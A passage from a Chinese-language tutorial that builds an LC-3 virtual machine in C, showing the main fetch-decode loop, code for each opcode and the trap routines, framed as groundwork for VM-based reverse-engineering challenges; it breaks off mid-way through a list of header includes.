<h2 id="5-模拟执行过程"><a href="#5-模拟执行过程" class="headerlink" title="5.    模拟执行过程"></a>5.    模拟执行过程</h2><p>这是逆向题中的核心思想，便是C语言如何执行虚拟机模式的，如何找到flag的指令生成顺序；</p>
<p>以下是我们需要编写的过程：</p>
<ol>
<li>从寄存器地址处的内存中加载一条指令。<code>PC</code></li>
<li>递增寄存器。<code>PC</code></li>
<li>查看<em>操作码</em>以确定它应该执行哪种类型的指令。</li>
<li>使用指令中的参数执行指令。</li>
<li>返回步骤 1。</li>
</ol>
<p>这样一来，就能模拟出虚拟机的内核了；</p>
<p><strong>代码5</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    &#123;代码<span class="number">1</span><span class="number">-2</span>&#125;</span><br><span class="line">    &#123;代码<span class="number">7</span><span class="number">-3</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* since exactly one condition flag should be set at any given time, set the Z flag */</span></span><br><span class="line">    reg[R_COND] = FL_ZRO;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* set the PC to starting position */</span></span><br><span class="line">    <span class="comment">/* 0x3000 is the default */</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> PC_START = <span class="number">0x3000</span> &#125;;</span><br><span class="line">    reg[R_PC] = PC_START;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> running = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (running)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* FETCH */</span></span><br><span class="line">        <span class="keyword">uint16_t</span> instr = mem_read(reg[R_PC]++);</span><br><span class="line">        <span class="keyword">uint16_t</span> op = instr &gt;&gt; <span class="number">12</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (op)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> OP_ADD:</span><br><span class="line">                &#123;代码<span class="number">6</span><span class="number">-1</span>&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_AND:</span><br><span class="line">                &#123;代码<span class="number">6</span><span class="number">-2</span>&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_NOT:</span><br><span class="line">                &#123;代码<span class="number">6</span><span class="number">-3</span>&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_BR:</span><br><span class="line">                &#123;代码<span class="number">6</span><span class="number">-4</span>&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_JMP:</span><br><span class="line">                &#123;代码<span class="number">6</span><span class="number">-5</span>&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_JSR:</span><br><span class="line">                &#123;代码<span class="number">6</span><span class="number">-6</span>&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_LD:</span><br><span class="line">                &#123;代码<span class="number">6</span><span class="number">-7</span>&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_LDI:</span><br><span class="line">                &#123;代码<span class="number">6</span><span class="number">-8</span>&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_LDR:</span><br><span class="line">                &#123;代码<span class="number">6</span><span class="number">-9</span>&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_LEA:</span><br><span class="line">                &#123;代码<span class="number">6</span><span class="number">-10</span>&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_ST:</span><br><span class="line">                &#123;代码<span class="number">6</span><span class="number">-11</span>&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_STI:</span><br><span class="line">                &#123;代码<span class="number">6</span><span class="number">-12</span>&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_STR:</span><br><span class="line">                &#123;代码<span class="number">6</span><span class="number">-13</span>&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_TRAP:</span><br><span class="line">                &#123;代码<span class="number">6</span><span class="number">-15</span>&#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_RES:</span><br><span class="line">            <span class="keyword">case</span> OP_RTI:</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">abort</span>();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#123;代码<span class="number">7</span><span class="number">-4</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>初始化条件控制寄存器后，从0x3000的地址出发，并进入运行状态（ while(1) ），instr便是每次会执行的PC所指的指令内容；OP即为操作指令，因为总共16位的寄存器最高4位都是操作指令，所以只需要将instr右移12位就能得到OP；</p>
<p>之后根据switch选择OP，执行相应的指令；每执行完一条便循环回去，于是PC+1，开始执行下一条；</p>
<h2 id="6-C语言模拟指令清单"><a href="#6-C语言模拟指令清单" class="headerlink" title="6.    C语言模拟指令清单"></a>6.    C语言模拟指令清单</h2><p>核心内容，需要结合指令集理解怎么实现的；</p>
<p><strong>代码6-1</strong>：和的实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* destination register (DR) */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="comment">/* first operand (SR1) */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> r1 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="comment">/* whether we are in immediate mode */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> imm_flag = (instr &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (imm_flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint16_t</span> imm5 = sign_extend(instr &amp; <span class="number">0x1F</span>, <span class="number">5</span>);</span><br><span class="line">        reg[r0] = reg[r1] + imm5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint16_t</span> r2 = instr &amp; <span class="number">0x7</span>;</span><br><span class="line">        reg[r0] = reg[r1] + reg[r2];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    update_flags(r0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码6-2</strong>：按位和</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> r1 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> imm_flag = (instr &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (imm_flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint16_t</span> imm5 = sign_extend(instr &amp; <span class="number">0x1F</span>, <span class="number">5</span>);</span><br><span class="line">        reg[r0] = reg[r1] &amp; imm5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint16_t</span> r2 = instr &amp; <span class="number">0x7</span>;</span><br><span class="line">        reg[r0] = reg[r1] &amp; reg[r2];</span><br><span class="line">    &#125;</span><br><span class="line">    update_flags(r0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码6-3</strong>：按位非</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> r1 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line"></span><br><span class="line">    reg[r0] = ~reg[r1];</span><br><span class="line">    update_flags(r0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码6-4</strong>：分支</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> pc_offset = sign_extend(instr &amp; <span class="number">0x1FF</span>, <span class="number">9</span>);</span><br><span class="line">    <span class="keyword">uint16_t</span> cond_flag = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">if</span> (cond_flag &amp; reg[R_COND])</span><br><span class="line">    &#123;</span><br><span class="line">        reg[R_PC] += pc_offset;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码6-5</strong>：跳转</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Also handles RET */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> r1 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    reg[R_PC] = reg[r1];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码6-6</strong>：寄存器跳转</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> long_flag = (instr &gt;&gt; <span class="number">11</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    reg[R_R7] = reg[R_PC];</span><br><span class="line">    <span class="keyword">if</span> (long_flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint16_t</span> long_pc_offset = sign_extend(instr &amp; <span class="number">0x7FF</span>, <span class="number">11</span>);</span><br><span class="line">        reg[R_PC] += long_pc_offset;  <span class="comment">/* JSR */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint16_t</span> r1 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">        reg[R_PC] = reg[r1]; <span class="comment">/* JSRR */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码6-7</strong>：加载</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> pc_offset = sign_extend(instr &amp; <span class="number">0x1FF</span>, <span class="number">9</span>);</span><br><span class="line">    reg[r0] = mem_read(reg[R_PC] + pc_offset);</span><br><span class="line">    update_flags(r0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码6-8</strong>：简介加载的实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* destination register (DR) */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="comment">/* PCoffset 9*/</span></span><br><span class="line">    <span class="keyword">uint16_t</span> pc_offset = sign_extend(instr &amp; <span class="number">0x1FF</span>, <span class="number">9</span>);</span><br><span class="line">    <span class="comment">/* add pc_offset to the current PC, look at that memory location to get the final address */</span></span><br><span class="line">    reg[r0] = mem_read(mem_read(reg[R_PC] + pc_offset));</span><br><span class="line">    update_flags(r0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码6-9</strong>：加载寄存器</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> r1 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> offset = sign_extend(instr &amp; <span class="number">0x3F</span>, <span class="number">6</span>);</span><br><span class="line">    reg[r0] = mem_read(reg[r1] + offset);</span><br><span class="line">    update_flags(r0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码6-10</strong>：加载有效地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> pc_offset = sign_extend(instr &amp; <span class="number">0x1FF</span>, <span class="number">9</span>);</span><br><span class="line">    reg[r0] = reg[R_PC] + pc_offset;</span><br><span class="line">    update_flags(r0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码6-11</strong>：存储</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> pc_offset = sign_extend(instr &amp; <span class="number">0x1FF</span>, <span class="number">9</span>);</span><br><span class="line">    mem_write(reg[R_PC] + pc_offset, reg[r0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码6-12</strong>：间接存储</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> pc_offset = sign_extend(instr &amp; <span class="number">0x1FF</span>, <span class="number">9</span>);</span><br><span class="line">    mem_write(mem_read(reg[R_PC] + pc_offset), reg[r0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码6-13</strong>：寄存器存储</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> r1 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> offset = sign_extend(instr &amp; <span class="number">0x3F</span>, <span class="number">6</span>);</span><br><span class="line">    mem_write(reg[r1] + offset, reg[r0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>LC-3 提供了一些预定义的例程，用于执行常见任务和与 I/O 设备交互。例如，有一些例程用于从键盘获取输入以及用于向控制台显示字符串。这些称为<em>trap routines</em>，您可以将其视为LC-3的操作系统或API。每个<em>trap routines</em>都分配有一个<em>trap code</em>来标识它（类似于操作码）。要执行一个，请使用所需routine的code调用该指令；</p>
<p>枚举所有trap<strong>代码6-14</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    TRAP_GETC = <span class="number">0x20</span>,  <span class="comment">/* get character from keyboard, not echoed onto the terminal */</span></span><br><span class="line">    TRAP_OUT = <span class="number">0x21</span>,   <span class="comment">/* output a character */</span></span><br><span class="line">    TRAP_PUTS = <span class="number">0x22</span>,  <span class="comment">/* output a word string */</span></span><br><span class="line">    TRAP_IN = <span class="number">0x23</span>,    <span class="comment">/* get character from keyboard, echoed onto the terminal */</span></span><br><span class="line">    TRAP_PUTSP = <span class="number">0x24</span>, <span class="comment">/* output a byte string */</span></span><br><span class="line">    TRAP_HALT = <span class="number">0x25</span>   <span class="comment">/* halt the program */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>为每个trap选择<strong>代码6-15</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (instr &amp; <span class="number">0xFF</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> TRAP_GETC:</span><br><span class="line">        &#123;代码<span class="number">6</span><span class="number">-16</span>&#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> TRAP_OUT:</span><br><span class="line">        &#123;代码<span class="number">6</span><span class="number">-17</span>&#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> TRAP_PUTS:</span><br><span class="line">        &#123;代码<span class="number">6</span><span class="number">-18</span>&#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> TRAP_IN:</span><br><span class="line">        &#123;代码<span class="number">6</span><span class="number">-19</span>&#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> TRAP_PUTSP:</span><br><span class="line">        &#123;代码<span class="number">6</span><span class="number">-20</span>&#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> TRAP_HALT:</span><br><span class="line">        &#123;代码<span class="number">6</span><span class="number">-21</span>&#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>trap指令清单：</p>
<p><strong>代码6-16</strong>：输入字符</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* read a single ASCII char */</span></span><br><span class="line">	reg[R_R0] = (<span class="keyword">uint16_t</span>)getchar();</span><br><span class="line">	update_flags(R_R0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码6-17</strong>：输出字符</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    putc((<span class="keyword">char</span>)reg[R_R0], <span class="built_in">stdout</span>);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码6-18</strong>：输出字符</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* one char per word */</span></span><br><span class="line">    <span class="keyword">uint16_t</span>* c = memory + reg[R_R0];</span><br><span class="line">    <span class="keyword">while</span> (*c)</span><br><span class="line">    &#123;</span><br><span class="line">        putc((<span class="keyword">char</span>)*c, <span class="built_in">stdout</span>);</span><br><span class="line">        ++c;</span><br><span class="line">    &#125;</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码6-19</strong>：准备输入字符</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter a character: &quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> c = getchar();</span><br><span class="line">    putc(c, <span class="built_in">stdout</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    reg[R_R0] = (<span class="keyword">uint16_t</span>)c;</span><br><span class="line">    update_flags(R_R0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码6-20</strong>：输出字符串</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* one char per byte (two bytes per word)</span></span><br><span class="line"><span class="comment">       here we need to swap back to</span></span><br><span class="line"><span class="comment">       big endian format */</span></span><br><span class="line">    <span class="keyword">uint16_t</span>* c = memory + reg[R_R0];</span><br><span class="line">    <span class="keyword">while</span> (*c)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> char1 = (*c) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        putc(char1, <span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">char</span> char2 = (*c) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">if</span> (char2) putc(char2, <span class="built_in">stdout</span>);</span><br><span class="line">        ++c;</span><br><span class="line">    &#125;</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码6-21</strong>：终止程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;HALT&quot;</span>);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line">	running = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="7-头部添加以及windows加入API"><a href="#7-头部添加以及windows加入API" class="headerlink" title="7.    头部添加以及windows加入API"></a>7.    头部添加以及windows加入API</h2><p>加入的头部：</p>
<p><strong>代码7-1</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span> <span class="comment">// uint16_t</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>  <span class="comment">// FILE</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span> <span class="comment">// SIGINT</span></span></span><br><span class="line"><span class="comment">/* windows only */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;conio.h&gt;</span>  <span class="comment">// _kbhit</span></span></span><br><span 